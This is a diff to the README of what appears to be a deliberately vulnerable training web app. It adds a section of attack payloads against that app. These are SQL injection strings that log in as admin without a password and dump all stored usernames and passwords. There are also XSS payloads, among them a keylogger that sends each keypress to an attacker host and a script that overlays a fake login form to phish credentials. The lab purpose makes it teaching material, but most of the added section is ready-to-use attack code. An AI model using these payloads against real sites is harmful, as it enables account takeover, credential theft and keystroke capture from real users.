@@ -126,3 +126,58 @@ You should see this like the screenshots below:
 
 ![Login Page](Documentation/Screenshot%20from%202024-04-29%2022-21-07.png)
 ![Register Page](Documentation/Screenshot%20from%202024-04-29%2022-21-55.png)
+
+
+## Exploiting the Web App
+
+### SQL Injection
+
+1. To login as an admin without knowing the password, enter the following payload in the username field and enter ```attack``` in the password field:
+``` sql
+' union select 1,'admin','attack'; -- '
+```
+
+
+3. To retrieve all the usernames and passwords from the database, enter the following payload in the username field, again enter ```attack``` in the password field:
+``` sql
+' union select 1, group_concat(concat_ws('|', user, password) separator ', '), 'attack' from credentials -- '
+```
+
+### Cross-Site Scripting (XSS)
+
+1. Simple alert box:
+``` html
+<img src="" onerror=alert('test')>
+
+<iframe src="javascript:alert('test');"></iframe>
+
+<div onmouseover="alert('test')">Hover over me</div>
+
+<a href="#" onclick="alert('test')">Click here</a>
+```
+
+2. Keylogger:
+``` html
+<img src="" onerror="document.addEventListener('keypress', function(e) { fetch('http://attacker.tld?key=' + String.fromCharCode(e.which)); }); this.remove();">
+```
+
+3. Fake Website
+``` html
+<img src="" onerror="(function(){
+  document.body.innerHTML = `
+    <div style='position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center;'>
+      <div style='background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center;'>
+        <h2 style='color: #1877f2; font-family: Helvetica, Arial, sans-serif; margin-bottom: 20px;'>Website</h2>
+        <form>
+          <input type='text' placeholder='Email or Phone Number' style='width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
+          <input type='password' placeholder='Password' style='width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
+          <button type='submit' style='width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;'>Log In</button>
+        </form>
+        <div style='margin-top: 10px;'>
+          <a href='#' style='color: #1877f2; font-size: 14px; text-decoration: none;'>Forgotten password?</a>
+        </div>
+      </div>
+    </div>
+  `;
+}())">
+```
